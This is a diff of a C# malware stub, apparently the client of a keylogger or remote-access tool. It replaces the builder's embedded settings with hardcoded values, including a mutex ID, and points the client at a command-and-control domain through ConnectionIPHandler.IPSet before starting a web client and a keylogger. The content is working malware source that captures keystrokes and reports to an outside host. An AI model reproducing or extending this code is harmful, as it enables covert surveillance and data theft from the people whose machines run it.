@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.ComponentModel;
 using System.IO;
 using System.Net;
@@ -55,8 +55,15 @@ namespace stub
         static void Main(string[] args)
         {
             string[] settingsArray = new string[8];
-            
-            AppDomain.CurrentDomain.ProcessExit += new EventHandler(CurrentDomain_ProcessExit);
+
+            settingsArray[0] = "True";
+            settingsArray[1] = "True";
+            settingsArray[2] = "True";
+            settingsArray[3] = "True"; 
+            settingsArray[4] = "True";
+            settingsArray[5] = "SystemXOR";
+
+            /*AppDomain.CurrentDomain.ProcessExit += new EventHandler(CurrentDomain_ProcessExit);
 
             using (StreamReader sr = new StreamReader(System.Reflection.Assembly.GetEntryAssembly().Location))
             {
@@ -66,11 +73,13 @@ namespace stub
                     string settings = Encoding.ASCII.GetString(stubBytes).Substring(Encoding.ASCII.GetString(stubBytes).IndexOf("BUILD")).Replace("BUILD", "");
                     settingsArray = settings.Split('|');
                 }
-            }
+            }*/
+
+
             string ID = settingsArray[5];
             MutexHandler.createMutex(ID);
             
-            ConnectionIPHandler.IPSet(settingsArray[6]);
+            ConnectionIPHandler.IPSet("delta.alphahq.dx.am");
             WebClientHandler.initwebClient();
 
             ClientKeylogger.initClientKeylogger();
